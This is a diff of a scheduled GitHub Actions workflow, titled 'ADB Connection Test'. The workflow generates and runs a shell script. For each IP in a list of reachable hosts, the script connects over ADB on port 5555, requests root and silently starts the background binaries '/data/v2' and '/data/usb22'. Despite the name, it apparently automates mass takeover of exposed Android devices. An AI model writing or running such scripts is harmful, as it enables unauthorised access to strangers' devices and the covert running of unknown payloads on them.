@@ -1,4 +1,4 @@
-name: ADB Connection Test py
+name: ADB Connection Test
 
 on:
   schedule:
@@ -73,18 +73,18 @@ jobs:
         echo '        for line in infile:' >> 33.py
         echo '            ip = line.strip()' >> 33.py
         echo '            if ip:' >> 33.py
-        echo '                outfile.write(f"adb connect \\"{ip}:5555\\"\n")' >> 33.py
-        echo '                outfile.write("adb root\n")' >> 33.py
-        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/v2 run > /dev/null 2> /data/error.log &\\"\'\n")' >> 33.py
-        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\\"\'\n")' >> 33.py
-        echo '                outfile.write(f"adb disconnect \\"{ip}:5555\\"\n")' >> 33.py
-        echo '                outfile.write("\n")' >> 33.py
+        echo '                outfile.write(f"adb connect \\"{ip}:5555\\"\\n")' >> 33.py
+        echo '                outfile.write("adb root\\n")' >> 33.py
+        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/v2 run > /dev/null 2> /data/error.log &\\"\'\\n")' >> 33.py
+        echo '                outfile.write(f"adb -s \\"{ip}:5555\\" shell \'sh -c \\"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\\"\'\\n")' >> 33.py
+        echo '                outfile.write(f"adb disconnect \\"{ip}:5555\\"\\n")' >> 33.py
+        echo '                outfile.write("\\n")' >> 33.py
         echo '' >> 33.py
         echo 'if __name__ == "__main__":' >> 33.py
         echo '    generate_adb_commands("reachable_ips.txt", "t.sh")' >> 33.py
 
         # 执行 Python 脚本生成 t.sh
         python3 33.py
-
+        cat t.sh
         # 执行生成的 t.sh 脚本
         bash t.sh
